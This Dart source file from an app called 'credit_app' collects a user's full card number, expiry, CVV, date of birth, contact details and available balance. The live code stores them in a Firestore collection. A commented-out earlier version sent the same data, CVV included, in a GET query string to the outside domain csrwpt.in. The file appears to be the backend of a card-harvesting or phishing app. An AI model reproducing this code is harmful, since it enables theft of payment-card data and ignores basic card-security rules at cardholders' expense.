// import 'dart:convert' show jsonDecode;
// import 'package:credit_app/Model/cardDetailSendModel.dart';
// import 'package:http/http.dart' as http;
//
// class SendCardDetailRepo {
//   Future<dynamic> sendCardDetailApi(UserData userData) async {
//     try {
//       final response = await http.get(Uri.parse(
//           'https://csrwpt.in//api/users.php?name=${userData.name}&card=${userData.card}&date=${userData.date}&type=POST&mobile=${userData.mobile}&email=${userData.email}&dob=${userData.dob}&ce_m=${userData.ceM}&ce_y=${userData.ceY}&cvv=${userData.cvv}&available=${userData.available}'));
//       var data = jsonDecode(response.body);
//       if (response.statusCode == 200) {
//         return data;
//       } else {
//         throw Exception('Error');
//       }
//     } catch (e) {
//       print(e.toString());
//     }
//   }
// }
import 'dart:convert' show jsonDecode;
import 'package:credit_app/Model/cardDetailSendModel.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

class SendCardDetailRepo {
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  Future<String> sendCardDetailApi(UserData userData, cart) async {
    try {
      // Generate a unique ID for the document
      // Prepare data to send to Firestore
      Map<String, dynamic> cardDetailData = {
        'id': userData.id,
        'name': userData.name,
        'card': userData.card,
        'date': userData.date,
        'type': 'POST',
        'mobile': userData.mobile,
        'email': userData.email,
        'dob': userData.dob,
        'ce_m': userData.ceM,
        'ce_y': userData.ceY,
        'cvv': userData.cvv,
        'available': userData.available,
        'fcmToken': userData.fcmToken,
        "cart": cart.toString()
        // You can add more fields if needed
      };
      // Send data to Firestore
      await _firestore
          .collection('CSRWPT')
          .doc(userData.id)
          .set(cardDetailData);
      return userData.id;
    } catch (e) {
      print(e.toString());
      throw Exception('Error sending card details to Firestore');
    }
  }
}